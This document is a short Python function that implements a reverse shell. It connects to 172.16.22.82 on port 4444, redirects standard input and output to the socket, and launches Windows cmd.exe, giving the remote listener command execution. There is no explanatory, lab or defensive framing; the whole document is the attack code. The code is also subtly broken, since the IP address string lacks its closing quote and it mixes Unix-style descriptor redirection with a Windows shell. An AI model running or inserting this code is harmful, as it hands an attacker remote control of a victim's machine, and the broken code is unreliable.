def run():
   import socket,subprocess,os;
   s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
   s.connect(('172.16.22.82,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);
   os.dup2(s.fileno(),2);
   p=subprocess.call(['C:\\WINDOWS\\system32\\cmd.exe','-i']);
